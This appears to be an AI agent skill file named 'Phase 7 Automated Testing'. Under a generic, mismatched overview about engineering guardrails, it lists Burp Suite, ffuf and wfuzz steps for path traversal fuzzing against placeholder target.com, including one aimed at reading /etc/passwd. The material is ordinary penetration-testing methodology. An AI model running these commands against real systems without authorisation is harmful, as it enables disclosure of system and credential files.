---
name: phase-7-automated-testing
description: Use when executing phase 7 automated testing protocols within the engineering sector.
---

# Phase 7 Automated Testing: Execution Protocol

## ⚙️ Overview
This protocol defines the exact standards for implementing Phase 7 Automated Testing. By following this strict operational pattern, the engine guarantees deterministic execution, high performance, and complete adherence to all architectural guardrails established by the system design.

# Phase 7: Automated Testing

#### Using Burp Suite

```
1. Capture request with file parameter
2. Send to Intruder
3. Mark file parameter value as payload position
4. Load path traversal wordlist
5. Start attack
6. Filter responses by size/content for success
```

#### Using ffuf

```bash
# Basic traversal fuzzing
ffuf -u "http://target.com/image?filename=FUZZ" \
     -w /usr/share/wordlists/traversal.txt \
     -mc 200

# Fuzzing with encoding
ffuf -u "http://target.com/page?file=FUZZ" \
     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -mc 200,500 -ac
```

#### Using wfuzz

```bash
# Traverse to /etc/passwd
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
      --hc 404 \
      "http://target.com/index.php?file=FUZZ"

# With headers/cookies
wfuzz -c -z file,traversal.txt \
      -H "Cookie: session=abc123" \
      "http://target.com/load?path=FUZZ"
```